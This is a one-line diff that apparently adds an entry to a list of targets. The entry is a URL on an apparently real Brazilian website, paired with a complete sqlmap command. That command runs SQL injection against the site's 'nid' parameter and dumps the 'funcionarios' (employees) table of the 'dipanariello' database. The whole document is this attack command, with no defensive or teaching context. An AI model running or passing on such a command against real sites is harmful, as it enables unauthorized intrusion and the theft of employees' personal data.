@@ -1,0 +1,1 @@
+http://www.dipanariello.com.br/noticia_exibe.php?nid=35 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.dipanariello.com.br/noticia_exibe.php?nid=35 -D dipanariello -T funcionarios --dump
